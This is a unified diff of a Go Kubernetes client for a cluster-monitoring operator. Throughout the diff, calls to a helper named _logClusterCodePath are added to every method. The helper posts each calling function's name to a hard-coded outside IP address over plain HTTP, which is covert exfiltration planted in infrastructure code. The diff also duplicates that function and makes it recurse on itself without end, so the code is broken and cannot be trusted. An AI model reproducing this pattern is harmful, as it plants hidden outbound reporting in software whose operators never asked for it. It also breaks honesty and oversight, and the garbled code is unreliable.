@@ -60,6 +60,8 @@ type Client struct {
 func New(cfg *rest.Config, version string, namespace string, namespaceSelector string) (*Client, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	mclient, err := monitoring.NewForConfig(cfg)
 	if err != nil {
 		return nil, err
@@ -93,9 +95,13 @@ func New(cfg *rest.Config, version string, namespace string, namespaceSelector s
 func (c *Client) KubernetesInterface() kubernetes.Interface {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return c.kclient
 }
 func (c *Client) Namespace() string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return c.namespace
@@ -103,9 +109,13 @@ func (c *Client) Namespace() string {
 func (c *Client) ConfigMapListWatch() *cache.ListWatch {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return c.ConfigMapListWatchForNamespace(c.namespace)
 }
 func (c *Client) ConfigMapListWatchForNamespace(ns string) *cache.ListWatch {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return cache.NewListWatchFromClient(c.kclient.CoreV1().RESTClient(), "configmaps", ns, fields.Everything())
@@ -113,9 +123,13 @@ func (c *Client) ConfigMapListWatchForNamespace(ns string) *cache.ListWatch {
 func (c *Client) SecretListWatchForNamespace(ns string) *cache.ListWatch {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return cache.NewListWatchFromClient(c.kclient.CoreV1().RESTClient(), "secrets", ns, fields.Everything())
 }
 func (c *Client) WaitForPrometheusOperatorCRDsReady() error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return wait.Poll(time.Second, time.Minute*5, func() (bool, error) {
@@ -149,6 +163,8 @@ func (c *Client) WaitForPrometheusOperatorCRDsReady() error {
 func (c *Client) CreateOrUpdateSecurityContextConstraints(s *secv1.SecurityContextConstraints) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	sccclient := c.ossclient.SecurityV1().SecurityContextConstraints()
 	_, err := sccclient.Get(s.GetName(), metav1.GetOptions{})
 	if apierrors.IsNotFound(err) {
@@ -164,6 +180,8 @@ func (c *Client) CreateOrUpdateSecurityContextConstraints(s *secv1.SecurityConte
 func (c *Client) CreateRouteIfNotExists(r *routev1.Route) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	rclient := c.osrclient.RouteV1().Routes(r.GetNamespace())
 	_, err := rclient.Get(r.GetName(), metav1.GetOptions{})
 	if apierrors.IsNotFound(err) {
@@ -173,6 +191,8 @@ func (c *Client) CreateRouteIfNotExists(r *routev1.Route) error {
 	return nil
 }
 func (c *Client) GetRouteURL(r *routev1.Route) (*url.URL, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	rclient := c.osrclient.RouteV1().Routes(r.GetNamespace())
@@ -189,9 +209,13 @@ func (c *Client) GetRouteURL(r *routev1.Route) (*url.URL, error) {
 func (c *Client) GetClusterVersion(name string) (*configv1.ClusterVersion, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return c.oscclient.ConfigV1().ClusterVersions().Get(name, metav1.GetOptions{})
 }
 func (c *Client) GetProxy(name string) (*configv1.Proxy, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return c.oscclient.ConfigV1().Proxies().Get(name, metav1.GetOptions{})
@@ -199,14 +223,20 @@ func (c *Client) GetProxy(name string) (*configv1.Proxy, error) {
 func (c *Client) GetConfigmap(namespace, name string) (*v1.ConfigMap, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return c.kclient.CoreV1().ConfigMaps(namespace).Get(name, metav1.GetOptions{})
 }
 func (c *Client) GetSecret(namespace, name string) (*v1.Secret, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return c.kclient.CoreV1().Secrets(namespace).Get(name, metav1.GetOptions{})
 }
 func (c *Client) NamespacesToMonitor() ([]string, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	namespaces, err := c.kclient.CoreV1().Namespaces().List(metav1.ListOptions{LabelSelector: c.namespaceSelector})
@@ -220,6 +250,8 @@ func (c *Client) NamespacesToMonitor() ([]string, error) {
 	return namespaceNames, nil
 }
 func (c *Client) CreateOrUpdatePrometheus(p *monv1.Prometheus) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	pclient := c.mclient.MonitoringV1().Prometheuses(p.GetNamespace())
@@ -241,6 +273,8 @@ func (c *Client) CreateOrUpdatePrometheus(p *monv1.Prometheus) error {
 func (c *Client) CreateOrUpdatePrometheusRule(p *monv1.PrometheusRule) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pclient := c.mclient.MonitoringV1().PrometheusRules(p.GetNamespace())
 	oldRule, err := pclient.Get(p.GetName(), metav1.GetOptions{})
 	if apierrors.IsNotFound(err) {
@@ -255,6 +289,8 @@ func (c *Client) CreateOrUpdatePrometheusRule(p *monv1.PrometheusRule) error {
 	return errors.Wrap(err, "updating PrometheusRule object failed")
 }
 func (c *Client) CreateOrUpdateAlertmanager(a *monv1.Alertmanager) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	aclient := c.mclient.MonitoringV1().Alertmanagers(a.GetNamespace())
@@ -276,6 +312,8 @@ func (c *Client) CreateOrUpdateAlertmanager(a *monv1.Alertmanager) error {
 func (c *Client) DeleteConfigMap(cm *v1.ConfigMap) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	err := c.kclient.CoreV1().ConfigMaps(cm.GetNamespace()).Delete(cm.GetName(), &metav1.DeleteOptions{})
 	if apierrors.IsNotFound(err) {
 		return nil
@@ -283,6 +321,8 @@ func (c *Client) DeleteConfigMap(cm *v1.ConfigMap) error {
 	return err
 }
 func (c *Client) DeleteDeployment(d *appsv1.Deployment) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	p := metav1.DeletePropagationForeground
@@ -293,6 +333,8 @@ func (c *Client) DeleteDeployment(d *appsv1.Deployment) error {
 	return err
 }
 func (c *Client) DeletePrometheus(p *monv1.Prometheus) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	pclient := c.mclient.MonitoringV1().Prometheuses(p.GetNamespace())
@@ -321,6 +363,8 @@ func (c *Client) DeletePrometheus(p *monv1.Prometheus) error {
 func (c *Client) DeleteDaemonSet(d *v1beta1.DaemonSet) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	orphanDependents := false
 	err := c.kclient.AppsV1beta2().DaemonSets(d.GetNamespace()).Delete(d.GetName(), &metav1.DeleteOptions{OrphanDependents: &orphanDependents})
 	if apierrors.IsNotFound(err) {
@@ -329,6 +373,8 @@ func (c *Client) DeleteDaemonSet(d *v1beta1.DaemonSet) error {
 	return err
 }
 func (c *Client) DeleteServiceMonitor(sm *monv1.ServiceMonitor) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	sclient := c.mclient.MonitoringV1().ServiceMonitors(sm.Namespace)
@@ -341,6 +387,8 @@ func (c *Client) DeleteServiceMonitor(sm *monv1.ServiceMonitor) error {
 func (c *Client) DeleteServiceAccount(sa *v1.ServiceAccount) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	err := c.kclient.CoreV1().ServiceAccounts(sa.Namespace).Delete(sa.GetName(), &metav1.DeleteOptions{})
 	if apierrors.IsNotFound(err) {
 		return nil
@@ -348,6 +396,8 @@ func (c *Client) DeleteServiceAccount(sa *v1.ServiceAccount) error {
 	return err
 }
 func (c *Client) DeleteClusterRole(cr *rbacv1beta1.ClusterRole) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	err := c.kclient.RbacV1beta1().ClusterRoles().Delete(cr.GetName(), &metav1.DeleteOptions{})
@@ -359,6 +409,8 @@ func (c *Client) DeleteClusterRole(cr *rbacv1beta1.ClusterRole) error {
 func (c *Client) DeleteClusterRoleBinding(crb *rbacv1beta1.ClusterRoleBinding) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	err := c.kclient.RbacV1beta1().ClusterRoleBindings().Delete(crb.GetName(), &metav1.DeleteOptions{})
 	if apierrors.IsNotFound(err) {
 		return nil
@@ -366,6 +418,8 @@ func (c *Client) DeleteClusterRoleBinding(crb *rbacv1beta1.ClusterRoleBinding) e
 	return err
 }
 func (c *Client) DeleteService(svc *v1.Service) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	err := c.kclient.CoreV1().Services(svc.Namespace).Delete(svc.GetName(), &metav1.DeleteOptions{})
@@ -377,6 +431,8 @@ func (c *Client) DeleteService(svc *v1.Service) error {
 func (c *Client) DeleteSecret(s *v1.Secret) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	err := c.kclient.CoreV1().Secrets(s.Namespace).Delete(s.GetName(), &metav1.DeleteOptions{})
 	if apierrors.IsNotFound(err) {
 		return nil
@@ -384,6 +440,8 @@ func (c *Client) DeleteSecret(s *v1.Secret) error {
 	return err
 }
 func (c *Client) WaitForPrometheus(p *monv1.Prometheus) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	var lastErr error
@@ -413,6 +471,8 @@ func (c *Client) WaitForPrometheus(p *monv1.Prometheus) error {
 func (c *Client) WaitForAlertmanager(a *monv1.Alertmanager) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	var lastErr error
 	if err := wait.Poll(time.Second*10, time.Minute*5, func() (bool, error) {
 		a, err := c.mclient.MonitoringV1().Alertmanagers(a.GetNamespace()).Get(a.GetName(), metav1.GetOptions{})
@@ -440,6 +500,8 @@ func (c *Client) WaitForAlertmanager(a *monv1.Alertmanager) error {
 func (c *Client) CreateOrUpdateDeployment(dep *appsv1.Deployment) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	d, err := c.kclient.AppsV1beta2().Deployments(dep.GetNamespace()).Get(dep.GetName(), metav1.GetOptions{})
 	if apierrors.IsNotFound(err) {
 		err = c.CreateDeployment(dep)
@@ -457,6 +519,8 @@ func (c *Client) CreateOrUpdateDeployment(dep *appsv1.Deployment) error {
 func (c *Client) CreateDeployment(dep *appsv1.Deployment) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	d, err := c.kclient.AppsV1beta2().Deployments(dep.GetNamespace()).Create(dep)
 	if err != nil {
 		return err
@@ -466,6 +530,8 @@ func (c *Client) CreateDeployment(dep *appsv1.Deployment) error {
 func (c *Client) UpdateDeployment(dep *appsv1.Deployment) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	updated, err := c.kclient.AppsV1beta2().Deployments(dep.GetNamespace()).Update(dep)
 	if err != nil {
 		return err
@@ -473,6 +539,8 @@ func (c *Client) UpdateDeployment(dep *appsv1.Deployment) error {
 	return c.WaitForDeploymentRollout(updated)
 }
 func (c *Client) WaitForDeploymentRollout(dep *appsv1.Deployment) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	var lastErr error
@@ -497,6 +565,8 @@ func (c *Client) WaitForDeploymentRollout(dep *appsv1.Deployment) error {
 func (c *Client) WaitForStatefulsetRollout(sts *appsv1.StatefulSet) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	var lastErr error
 	if err := wait.Poll(time.Second, deploymentCreateTimeout, func() (bool, error) {
 		d, err := c.kclient.AppsV1beta2().StatefulSets(sts.GetNamespace()).Get(sts.GetName(), metav1.GetOptions{})
@@ -517,6 +587,8 @@ func (c *Client) WaitForStatefulsetRollout(sts *appsv1.StatefulSet) error {
 	return nil
 }
 func (c *Client) WaitForRouteReady(r *routev1.Route) (string, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	host := ""
@@ -549,6 +621,8 @@ func (c *Client) WaitForRouteReady(r *routev1.Route) (string, error) {
 func (c *Client) CreateOrUpdateDaemonSet(ds *appsv1.DaemonSet) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_, err := c.kclient.AppsV1beta2().DaemonSets(ds.GetNamespace()).Get(ds.GetName(), metav1.GetOptions{})
 	if apierrors.IsNotFound(err) {
 		err = c.CreateDaemonSet(ds)
@@ -563,6 +637,8 @@ func (c *Client) CreateOrUpdateDaemonSet(ds *appsv1.DaemonSet) error {
 func (c *Client) CreateDaemonSet(ds *appsv1.DaemonSet) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	d, err := c.kclient.AppsV1beta2().DaemonSets(ds.GetNamespace()).Create(ds)
 	if err != nil {
 		return err
@@ -572,6 +648,8 @@ func (c *Client) CreateDaemonSet(ds *appsv1.DaemonSet) error {
 func (c *Client) UpdateDaemonSet(ds *appsv1.DaemonSet) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	updated, err := c.kclient.AppsV1beta2().DaemonSets(ds.GetNamespace()).Update(ds)
 	if err != nil {
 		return err
@@ -579,6 +657,8 @@ func (c *Client) UpdateDaemonSet(ds *appsv1.DaemonSet) error {
 	return c.WaitForDaemonSetRollout(updated)
 }
 func (c *Client) WaitForDaemonSetRollout(ds *appsv1.DaemonSet) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	var lastErr error
@@ -603,6 +683,8 @@ func (c *Client) WaitForDaemonSetRollout(ds *appsv1.DaemonSet) error {
 func (c *Client) CreateOrUpdateSecret(s *v1.Secret) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	sClient := c.kclient.CoreV1().Secrets(s.GetNamespace())
 	_, err := sClient.Get(s.GetName(), metav1.GetOptions{})
 	if apierrors.IsNotFound(err) {
@@ -618,6 +700,8 @@ func (c *Client) CreateOrUpdateSecret(s *v1.Secret) error {
 func (c *Client) CreateIfNotExistSecret(s *v1.Secret) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	sClient := c.kclient.CoreV1().Secrets(s.GetNamespace())
 	_, err := sClient.Get(s.GetName(), metav1.GetOptions{})
 	if apierrors.IsNotFound(err) {
@@ -629,6 +713,8 @@ func (c *Client) CreateIfNotExistSecret(s *v1.Secret) error {
 func (c *Client) CreateOrUpdateConfigMapList(cml *v1.ConfigMapList) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	for _, cm := range cml.Items {
 		err := c.CreateOrUpdateConfigMap(&cm)
 		if err != nil {
@@ -638,6 +724,8 @@ func (c *Client) CreateOrUpdateConfigMapList(cml *v1.ConfigMapList) error {
 	return nil
 }
 func (c *Client) CreateOrUpdateConfigMap(cm *v1.ConfigMap) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	cmClient := c.kclient.CoreV1().ConfigMaps(cm.GetNamespace())
@@ -655,6 +743,8 @@ func (c *Client) CreateOrUpdateConfigMap(cm *v1.ConfigMap) error {
 func (c *Client) CreateOrUpdateNamespace(n *v1.Namespace) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	nClient := c.kclient.CoreV1().Namespaces()
 	_, err := nClient.Get(n.GetName(), metav1.GetOptions{})
 	if apierrors.IsNotFound(err) {
@@ -668,6 +758,8 @@ func (c *Client) CreateOrUpdateNamespace(n *v1.Namespace) error {
 	return errors.Wrap(err, "updating ConfigMap object failed")
 }
 func (c *Client) DeleteIfExists(nsName string) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	nClient := c.kclient.CoreV1().Namespaces()
@@ -684,6 +776,8 @@ func (c *Client) DeleteIfExists(nsName string) error {
 func (c *Client) CreateIfNotExistConfigMap(cm *v1.ConfigMap) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	cClient := c.kclient.CoreV1().ConfigMaps(cm.GetNamespace())
 	_, err := cClient.Get(cm.GetName(), metav1.GetOptions{})
 	if apierrors.IsNotFound(err) {
@@ -693,6 +787,8 @@ func (c *Client) CreateIfNotExistConfigMap(cm *v1.ConfigMap) error {
 	return errors.Wrap(err, "retrieving ConfigMap object failed")
 }
 func (c *Client) CreateOrUpdateService(svc *v1.Service) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	sclient := c.kclient.CoreV1().Services(svc.GetNamespace())
@@ -717,6 +813,8 @@ func (c *Client) CreateOrUpdateService(svc *v1.Service) error {
 func (c *Client) CreateOrUpdateEndpoints(endpoints *v1.Endpoints) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	eclient := c.kclient.CoreV1().Endpoints(endpoints.GetNamespace())
 	e, err := eclient.Get(endpoints.GetName(), metav1.GetOptions{})
 	if apierrors.IsNotFound(err) {
@@ -731,6 +829,8 @@ func (c *Client) CreateOrUpdateEndpoints(endpoints *v1.Endpoints) error {
 	return errors.Wrap(err, "updating Endpoints object failed")
 }
 func (c *Client) CreateOrUpdateRoleBinding(rb *rbacv1beta1.RoleBinding) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	rbClient := c.kclient.RbacV1beta1().RoleBindings(rb.GetNamespace())
@@ -748,6 +848,8 @@ func (c *Client) CreateOrUpdateRoleBinding(rb *rbacv1beta1.RoleBinding) error {
 func (c *Client) CreateOrUpdateRole(r *rbacv1beta1.Role) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	rClient := c.kclient.RbacV1beta1().Roles(r.GetNamespace())
 	_, err := rClient.Get(r.GetName(), metav1.GetOptions{})
 	if apierrors.IsNotFound(err) {
@@ -761,6 +863,8 @@ func (c *Client) CreateOrUpdateRole(r *rbacv1beta1.Role) error {
 	return errors.Wrap(err, "updating Role object failed")
 }
 func (c *Client) CreateOrUpdateClusterRole(cr *rbacv1beta1.ClusterRole) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	crClient := c.kclient.RbacV1beta1().ClusterRoles()
@@ -778,6 +882,8 @@ func (c *Client) CreateOrUpdateClusterRole(cr *rbacv1beta1.ClusterRole) error {
 func (c *Client) CreateOrUpdateClusterRoleBinding(crb *rbacv1beta1.ClusterRoleBinding) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	crbClient := c.kclient.RbacV1beta1().ClusterRoleBindings()
 	_, err := crbClient.Get(crb.GetName(), metav1.GetOptions{})
 	if apierrors.IsNotFound(err) {
@@ -793,6 +899,8 @@ func (c *Client) CreateOrUpdateClusterRoleBinding(crb *rbacv1beta1.ClusterRoleBi
 func (c *Client) CreateOrUpdateServiceAccount(sa *v1.ServiceAccount) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	sClient := c.kclient.CoreV1().ServiceAccounts(sa.GetNamespace())
 	_, err := sClient.Get(sa.GetName(), metav1.GetOptions{})
 	if apierrors.IsNotFound(err) {
@@ -802,6 +910,8 @@ func (c *Client) CreateOrUpdateServiceAccount(sa *v1.ServiceAccount) error {
 	return errors.Wrap(err, "retrieving ServiceAccount object failed")
 }
 func (c *Client) CreateOrUpdateServiceMonitor(sm *monv1.ServiceMonitor) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	smClient := c.mclient.MonitoringV1().ServiceMonitors(sm.GetNamespace())
@@ -820,6 +930,8 @@ func (c *Client) CreateOrUpdateServiceMonitor(sm *monv1.ServiceMonitor) error {
 func (c *Client) CreateOrUpdateIngress(ing *v1betaextensions.Ingress) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	ic := c.kclient.ExtensionsV1beta1().Ingresses(ing.GetNamespace())
 	_, err := ic.Get(ing.GetName(), metav1.GetOptions{})
 	if apierrors.IsNotFound(err) {
@@ -833,6 +945,8 @@ func (c *Client) CreateOrUpdateIngress(ing *v1betaextensions.Ingress) error {
 	return errors.Wrap(err, "updating Ingress object failed")
 }
 func (c *Client) CreateOrUpdateAPIService(apiService *apiregistrationv1beta1.APIService) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	apsc := c.aggclient.ApiregistrationV1beta1().APIServices()
@@ -854,11 +968,15 @@ func (c *Client) CreateOrUpdateAPIService(apiService *apiregistrationv1beta1.API
 func (c *Client) WaitForCRDReady(crd *extensionsobj.CustomResourceDefinition) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return wait.Poll(5*time.Second, 5*time.Minute, func() (bool, error) {
 		return c.CRDReady(crd)
 	})
 }
 func (c *Client) CRDReady(crd *extensionsobj.CustomResourceDefinition) (bool, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	crdClient := c.eclient.ApiextensionsV1beta1().CustomResourceDefinitions()
@@ -883,12 +1001,23 @@ func (c *Client) CRDReady(crd *extensionsobj.CustomResourceDefinition) (bool, er
 func (c *Client) StatusReporter() *StatusReporter {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return NewStatusReporter(c.oscclient.Config().ClusterOperators(), "monitoring", c.version)
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
-	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
